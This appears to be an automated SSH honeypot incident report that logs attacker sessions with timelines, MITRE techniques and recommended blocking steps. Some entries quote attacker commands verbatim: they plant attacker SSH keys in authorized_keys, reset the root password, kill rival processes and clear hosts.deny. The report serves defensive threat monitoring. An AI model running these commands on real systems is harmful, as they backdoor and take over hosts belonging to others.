| **First Seen** | 2026-08-10 17:47 |
| **Last Seen** | 2026-08-10 17:52 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:3Ek0E3kgrsa5"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:47:25` | `cowrie.session.connect` |
| `2026-08-10 17:47:26` | `cowrie.client.version` |
| `2026-08-10 17:47:27` | `cowrie.client.kex` |
| `2026-08-10 17:47:28` | `cowrie.login.success` |
| `2026-08-10 17:47:32` | `cowrie.session.params` |
| `2026-08-10 17:47:32` | `cowrie.command.input` |
| `2026-08-10 17:47:32` | `cowrie.command.failed` |
| `2026-08-10 17:47:32` | `cowrie.log.closed` |
| `2026-08-10 17:47:33` | `cowrie.session.params` |
| `2026-08-10 17:47:33` | `cowrie.command.input` |
| `2026-08-10 17:47:33` | `cowrie.session.file_download` |
| `2026-08-10 17:47:33` | `cowrie.log.closed` |
| `2026-08-10 17:47:51` | `cowrie.session.params` |
| `2026-08-10 17:47:51` | `cowrie.command.input` |
| `2026-08-10 17:47:51` | `cowrie.log.closed` |
| `2026-08-10 17:47:53` | `cowrie.session.params` |
| `2026-08-10 17:47:53` | `cowrie.command.input` |
| `2026-08-10 17:47:53` | `cowrie.log.closed` |
| `2026-08-10 17:47:54` | `cowrie.session.params` |
| `2026-08-10 17:47:54` | `cowrie.command.input` |
| `2026-08-10 17:47:54` | `cowrie.session.file_download` |
| `2026-08-10 17:47:54` | `cowrie.log.closed` |
| `2026-08-10 17:47:56` | `cowrie.session.params` |
| `2026-08-10 17:47:56` | `cowrie.command.input` |
| `2026-08-10 17:47:56` | `cowrie.log.closed` |
| `2026-08-10 17:47:59` | `cowrie.session.params` |
| `2026-08-10 17:47:59` | `cowrie.command.input` |
| `2026-08-10 17:47:59` | `cowrie.log.closed` |
| `2026-08-10 17:48:01` | `cowrie.session.params` |
| `2026-08-10 17:48:01` | `cowrie.command.input` |
| `2026-08-10 17:48:01` | `cowrie.command.input` |
| `2026-08-10 17:48:01` | `cowrie.log.closed` |
| `2026-08-10 17:48:02` | `cowrie.session.params` |
| `2026-08-10 17:48:02` | `cowrie.command.input` |
| `2026-08-10 17:48:03` | `cowrie.log.closed` |
| `2026-08-10 17:48:04` | `cowrie.session.params` |
| `2026-08-10 17:48:04` | `cowrie.command.input` |
| `2026-08-10 17:48:05` | `cowrie.log.closed` |
| `2026-08-10 17:48:06` | `cowrie.session.params` |
| `2026-08-10 17:48:06` | `cowrie.command.input` |
| `2026-08-10 17:48:06` | `cowrie.log.closed` |
| `2026-08-10 17:48:07` | `cowrie.session.params` |
| `2026-08-10 17:48:07` | `cowrie.command.input` |
| `2026-08-10 17:48:08` | `cowrie.log.closed` |
| `2026-08-10 17:48:09` | `cowrie.session.params` |
| `2026-08-10 17:48:09` | `cowrie.command.input` |
| `2026-08-10 17:48:09` | `cowrie.log.closed` |
| `2026-08-10 17:48:10` | `cowrie.session.params` |
| `2026-08-10 17:48:10` | `cowrie.command.input` |
| `2026-08-10 17:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.157[.]138` to AbuseIPDB if not already reported
- [ ] Block `101.126.157[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36be9b52a018

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 18:05 |
| **Last Seen** | 2026-08-10 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:05:18` | `cowrie.session.connect` |
| `2026-08-10 18:05:18` | `cowrie.client.version` |
| `2026-08-10 18:05:18` | `cowrie.client.kex` |
| `2026-08-10 18:05:19` | `cowrie.login.success` |
| `2026-08-10 18:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d15e20149e1

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 18:05 |
| **Last Seen** | 2026-08-10 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:05:18` | `cowrie.session.connect` |
| `2026-08-10 18:05:18` | `cowrie.client.version` |
| `2026-08-10 18:05:18` | `cowrie.client.kex` |
| `2026-08-10 18:05:19` | `cowrie.login.success` |
| `2026-08-10 18:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af289c91797e

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 18:05 |
| **Last Seen** | 2026-08-10 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:05:23` | `cowrie.session.connect` |
| `2026-08-10 18:05:23` | `cowrie.client.version` |
| `2026-08-10 18:05:24` | `cowrie.client.kex` |
| `2026-08-10 18:05:25` | `cowrie.login.success` |
| `2026-08-10 18:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b285450427c

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 18:05 |
| **Last Seen** | 2026-08-10 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:05:25` | `cowrie.session.connect` |
| `2026-08-10 18:05:25` | `cowrie.client.version` |
| `2026-08-10 18:05:25` | `cowrie.client.kex` |
| `2026-08-10 18:05:26` | `cowrie.login.success` |
| `2026-08-10 18:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5a4edf6d38

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-08-10 18:09 |
| **Last Seen** | 2026-08-10 18:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:09:56` | `cowrie.session.connect` |
| `2026-08-10 18:09:57` | `cowrie.client.version` |
| `2026-08-10 18:09:57` | `cowrie.client.kex` |
| `2026-08-10 18:09:58` | `cowrie.login.success` |
| `2026-08-10 18:09:59` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63df87a1e0b

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-08-10 18:10 |
| **Last Seen** | 2026-08-10 18:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:10:08` | `cowrie.session.connect` |
| `2026-08-10 18:10:09` | `cowrie.client.version` |
| `2026-08-10 18:10:09` | `cowrie.client.kex` |
| `2026-08-10 18:10:11` | `cowrie.login.success` |
| `2026-08-10 18:10:12` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2474bfc9eae

| Field | Detail |
|---|---|
| **Source IP** | `60.249.245[.]163` |
| **First Seen** | 2026-08-10 18:12 |
| **Last Seen** | 2026-08-10 18:13 |
| **Session Duration** | 69s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:12:16` | `cowrie.session.connect` |
| `2026-08-10 18:12:16` | `cowrie.client.version` |
| `2026-08-10 18:12:16` | `cowrie.client.kex` |
| `2026-08-10 18:12:17` | `cowrie.login.success` |
| `2026-08-10 18:13:25` | `cowrie.session.file_upload` |
| `2026-08-10 18:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.245[.]163` to AbuseIPDB if not already reported
- [ ] Block `60.249.245[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05019180dce4

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-08-10 18:14 |
| **Last Seen** | 2026-08-10 18:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:14:38` | `cowrie.session.connect` |
| `2026-08-10 18:14:38` | `cowrie.client.version` |
| `2026-08-10 18:14:38` | `cowrie.client.kex` |
| `2026-08-10 18:14:40` | `cowrie.login.success` |
| `2026-08-10 18:14:40` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bae72881ba6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:15 |
| **Last Seen** | 2026-08-10 18:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:15:12` | `cowrie.session.connect` |
| `2026-08-10 18:15:13` | `cowrie.client.version` |
| `2026-08-10 18:15:13` | `cowrie.client.kex` |
| `2026-08-10 18:15:18` | `cowrie.login.success` |
| `2026-08-10 18:15:20` | `cowrie.session.params` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.success` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:20` | `cowrie.command.input` |
| `2026-08-10 18:15:21` | `cowrie.log.closed` |
| `2026-08-10 18:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f91f0389000

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 18:16 |
| **Last Seen** | 2026-08-10 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:16:09` | `cowrie.session.connect` |
| `2026-08-10 18:16:09` | `cowrie.client.version` |
| `2026-08-10 18:16:09` | `cowrie.client.kex` |
| `2026-08-10 18:16:09` | `cowrie.login.success` |
| `2026-08-10 18:16:09` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:16:09` | `cowrie.direct-tcpip.data` |
| `2026-08-10 18:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99048bdcbedc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:18 |
| **Last Seen** | 2026-08-10 18:18 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:18:00` | `cowrie.session.connect` |
| `2026-08-10 18:18:01` | `cowrie.client.version` |
| `2026-08-10 18:18:01` | `cowrie.client.kex` |
| `2026-08-10 18:18:07` | `cowrie.login.success` |
| `2026-08-10 18:18:10` | `cowrie.session.params` |
| `2026-08-10 18:18:10` | `cowrie.command.input` |
| `2026-08-10 18:18:10` | `cowrie.command.input` |
| `2026-08-10 18:18:10` | `cowrie.command.input` |
| `2026-08-10 18:18:10` | `cowrie.command.input` |
| `2026-08-10 18:18:10` | `cowrie.command.input` |
| `2026-08-10 18:18:10` | `cowrie.command.success` |
| `2026-08-10 18:18:10` | `cowrie.command.input` |
| `2026-08-10 18:18:10` | `cowrie.command.input` |
| `2026-08-10 18:18:11` | `cowrie.command.input` |
| `2026-08-10 18:18:11` | `cowrie.command.input` |
| `2026-08-10 18:18:11` | `cowrie.log.closed` |
| `2026-08-10 18:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a19b0bdce663

| Field | Detail |
|---|---|
| **Source IP** | `179.189.85[.]66` |
| **First Seen** | 2026-08-10 18:19 |
| **Last Seen** | 2026-08-10 18:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:19:46` | `cowrie.session.connect` |
| `2026-08-10 18:19:46` | `cowrie.client.version` |
| `2026-08-10 18:19:46` | `cowrie.client.kex` |
| `2026-08-10 18:19:48` | `cowrie.login.success` |
| `2026-08-10 18:19:48` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.189.85[.]66` to AbuseIPDB if not already reported
- [ ] Block `179.189.85[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10bbf041939a

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]50` |
| **First Seen** | 2026-08-10 18:19 |
| **Last Seen** | 2026-08-10 18:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:19:58` | `cowrie.session.connect` |
| `2026-08-10 18:19:59` | `cowrie.client.version` |
| `2026-08-10 18:19:59` | `cowrie.client.kex` |
| `2026-08-10 18:20:01` | `cowrie.login.success` |
| `2026-08-10 18:20:01` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d92e6cba10d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:20 |
| **Last Seen** | 2026-08-10 18:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:20:47` | `cowrie.session.connect` |
| `2026-08-10 18:20:48` | `cowrie.client.version` |
| `2026-08-10 18:20:48` | `cowrie.client.kex` |
| `2026-08-10 18:20:51` | `cowrie.login.success` |
| `2026-08-10 18:20:53` | `cowrie.session.params` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.success` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:53` | `cowrie.command.input` |
| `2026-08-10 18:20:54` | `cowrie.log.closed` |
| `2026-08-10 18:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc69bca9a068

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:23 |
| **Last Seen** | 2026-08-10 18:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:23:43` | `cowrie.session.connect` |
| `2026-08-10 18:23:44` | `cowrie.client.version` |
| `2026-08-10 18:23:44` | `cowrie.client.kex` |
| `2026-08-10 18:23:46` | `cowrie.login.success` |
| `2026-08-10 18:23:49` | `cowrie.session.params` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.success` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:49` | `cowrie.command.input` |
| `2026-08-10 18:23:50` | `cowrie.log.closed` |
| `2026-08-10 18:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b154e66e111f

| Field | Detail |
|---|---|
| **Source IP** | `149.28.138[.]88` |
| **First Seen** | 2026-08-10 18:24 |
| **Last Seen** | 2026-08-10 18:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:24:44` | `cowrie.session.connect` |
| `2026-08-10 18:24:44` | `cowrie.client.version` |
| `2026-08-10 18:24:44` | `cowrie.client.kex` |
| `2026-08-10 18:24:47` | `cowrie.login.success` |
| `2026-08-10 18:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.28.138[.]88` to AbuseIPDB if not already reported
- [ ] Block `149.28.138[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a5a46a21ed

| Field | Detail |
|---|---|
| **Source IP** | `149.28.138[.]88` |
| **First Seen** | 2026-08-10 18:24 |
| **Last Seen** | 2026-08-10 18:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:24:47` | `cowrie.session.connect` |
| `2026-08-10 18:24:47` | `cowrie.client.version` |
| `2026-08-10 18:24:48` | `cowrie.client.kex` |
| `2026-08-10 18:24:50` | `cowrie.login.success` |
| `2026-08-10 18:24:52` | `cowrie.session.params` |
| `2026-08-10 18:24:52` | `cowrie.command.input` |
| `2026-08-10 18:24:52` | `cowrie.log.closed` |
| `2026-08-10 18:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.28.138[.]88` to AbuseIPDB if not already reported
- [ ] Block `149.28.138[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38bff9868e69

| Field | Detail |
|---|---|
| **Source IP** | `149.28.138[.]88` |
| **First Seen** | 2026-08-10 18:24 |
| **Last Seen** | 2026-08-10 18:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/ayDvt2T7w5UMuo1kIYefBQRKc661934f6dd2a58NAIs7ehhoG56IVFPUdooUza00ziduX/8vgd29UmSZk8Y+7bAh0cP43C3N0/M6RlV8Qy2onqrF02RbeTu9tzhuBBJA//7ZHzoL/0dbGhwrGOrxSmqPnNO4VL/W8gOHYyDRSLPfUpTJNsP9AulmmQeaYXcQOZ4pFzMpiGZwSXJYw9xcrz7PMmMAcCOYbAWJYz9LT980nY3XgQb9QSKDoGuRlqm5HPdY2bipGgFwgwNGG0V4bQLCUMKudkq6oWL rsa-key-20250409' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/author` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

